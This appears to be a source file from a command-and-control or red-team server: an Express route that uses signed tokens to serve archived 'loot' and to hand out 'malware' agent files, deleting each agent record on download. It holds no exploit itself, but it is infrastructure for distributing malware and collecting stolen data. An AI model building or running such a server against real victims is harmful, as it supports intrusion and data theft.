const express = require('express');
const middleware = require("../middleware/middleware.js");
const jwt = require('jsonwebtoken');
const Agent = require('../lib/models/Agent.js');
const fs = require('fs');
const path = require('path');

const UNITS_PATH = process.env.UNITS_PATH || '/units';
const AGENT_PATH = process.env.AGENT_PATH || '/agents';

const router = express.Router();


router.get('/', middleware.downloadToken, async (req, res) => {
  try {
    if (req.jwtData.type === 'loot') {
      const tarPath = path.join(UNITS_PATH, `loot_${req.jwtData.token}.tar.xz`);
      if (!fs.existsSync(tarPath)) return res.status(404).send({ msg: 'loot not found' });
      res.download(tarPath, `loot_${req.jwtData.token}.tar.xz`);
    } else if (req.jwtData.type === 'agent') {
      const malwarePath = path.join(AGENT_PATH, req.jwtData.file);
      if (!fs.existsSync(malwarePath)) return res.status(404).send({ msg: 'malware not found' });
      await Agent.findOneAndDelete({ file: req.jwtData.token });
      res.download(malwarePath, req.jwtData.file);
    } else {
      return res.status(400).send({ msg: 'unknown token type' });
    }
  } catch (e) {
    return res.status(500).send({ msg: 'internal server error' });
  }
});

module.exports = router;

